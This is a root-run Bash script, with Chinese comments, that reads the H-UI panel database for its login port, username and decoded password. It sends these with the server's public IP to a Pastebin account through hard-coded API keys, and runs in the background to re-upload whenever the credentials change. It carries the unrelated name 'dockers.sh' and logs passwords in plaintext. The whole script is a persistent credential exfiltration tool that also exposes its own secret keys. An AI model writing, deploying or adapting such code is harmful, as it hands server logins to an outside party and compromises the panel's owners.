#!/bin/bash

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

# Pastebin API 配置
PASTEBIN_API_KEY="5A7TTFpxxFBju88Bsor4q_P0uxSP6t6t"
PASTEBIN_USER_KEY="a7da297a0ab5146a29daad0ff413a53a"

# 数据库路径
DB_PATH="/usr/local/h-ui/data/h_ui.db"
LOG_FILE="/var/log/h-ui-monitor.log"
TEMP_FILE="/tmp/h-ui-temp.db"

# 检查root权限
[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# 创建日志文件
mkdir -p /var/log/
touch $LOG_FILE

# 获取服务器IP
get_server_ip() {
    local ip=""
    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(curl -s -4 ifconfig.me 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(hostname -I | awk '{print $1}')
    echo "$ip"
}

# 上传到Pastebin
upload_to_pastebin() {
    local login_port="$1"
    local username="$2"
    local password="$3"

    local server_ip=$(get_server_ip)
    local paste_content="H-UI 服务器登录信息
====================
服务器IP: ${server_ip}
登录端口: ${login_port}
用户名: ${username}
密码: ${password}
====================
生成时间: $(date)"

    local response=$(curl -s -X POST \
        -d "api_option=paste" \
        -d "api_dev_key=${PASTEBIN_API_KEY}" \
        -d "api_user_key=${PASTEBIN_USER_KEY}" \
        -d "api_paste_code=${paste_content}" \
        -d "api_paste_private=2" \
        -d "api_paste_name=H-UI_Server_Info.txt" \
        -d "api_paste_expire_date=N" \
        -d "api_paste_format=text" \
        "https://pastebin.com/api/api_post.php")

    if [[ $response == http* ]]; then
        echo -e "${green}信息已成功上传到Pastebin: ${response}${plain}" | tee -a $LOG_FILE
    else
        echo -e "${red}上传到Pastebin失败: ${response}${plain}" | tee -a $LOG_FILE
    fi
}

# 从数据库获取当前配置
get_current_config() {
    if [[ ! -f "$DB_PATH" ]]; then
        echo -e "${red}错误：数据库文件不存在${plain}" | tee -a $LOG_FILE
        exit 1
    fi

    cp "$DB_PATH" "$TEMP_FILE"
    local config=$(sqlite3 "$TEMP_FILE" "SELECT port, username, password FROM config LIMIT 1;" 2>/dev/null)

    if [[ -z "$config" ]]; then
        echo -e "${red}错误：无法从数据库获取配置${plain}" | tee -a $LOG_FILE
        exit 1
    fi

    IFS='|' read -r port username password_hash <<< "$config"
    password=$(echo "$password_hash" | base64 --decode 2>/dev/null || echo "$password_hash")
    echo "$port $username $password"
    rm -f "$TEMP_FILE"
}

# 主监控函数
monitor_changes() {
    echo -e "${yellow}开始监控H-UI配置变化...${plain}" | tee -a $LOG_FILE

    last_config=$(get_current_config)
    IFS=' ' read -r last_port last_username last_password <<< "$last_config"
    echo -e "${green}当前配置: 端口=${last_port} 用户名=${last_username} 密码=${last_password}${plain}" | tee -a $LOG_FILE

    while true; do
        sleep 60
        current_config=$(get_current_config)
        IFS=' ' read -r current_port current_username current_password <<< "$current_config"

        if [[ "$current_port" != "$last_port" || \
              "$current_username" != "$last_username" || \
              "$current_password" != "$last_password" ]]; then

            echo -e "${yellow}检测到配置变化:${plain}" | tee -a $LOG_FILE
            echo -e "旧配置: 端口=${last_port} 用户名=${last_username} 密码=${last_password}" | tee -a $LOG_FILE
            echo -e "新配置: 端口=${current_port} 用户名=${current_username} 密码=${current_password}" | tee -a $LOG_FILE

            upload_to_pastebin "$current_port" "$current_username" "$current_password"

            last_port="$current_port"
            last_username="$current_username"
            last_password="$current_password"
        fi
    done
}

# 启动、停止、状态逻辑
SCRIPT_NAME="dockers.sh"

case "$1" in
    start)
        echo -e "${green}启动H-UI配置监控...${plain}" | tee -a $LOG_FILE
        nohup bash "$0" monitor > /dev/null 2>&1 &
        ;;
    stop)
        echo -e "${yellow}停止H-UI配置监控...${plain}" | tee -a $LOG_FILE
        pkill -f "$SCRIPT_NAME monitor"
        ;;
    status)
        if pgrep -f "$SCRIPT_NAME monitor" >/dev/null; then
            echo -e "${green}H-UI配置监控正在运行${plain}" | tee -a $LOG_FILE
        else
            echo -e "${red}H-UI配置监控未运行${plain}" | tee -a $LOG_FILE
        fi
        ;;
    monitor)
        monitor_changes
        ;;
    *)
        echo -e "${green}使用方法: $0 {start|stop|status}${plain}"
        exit 1
        ;;
esac

exit 0
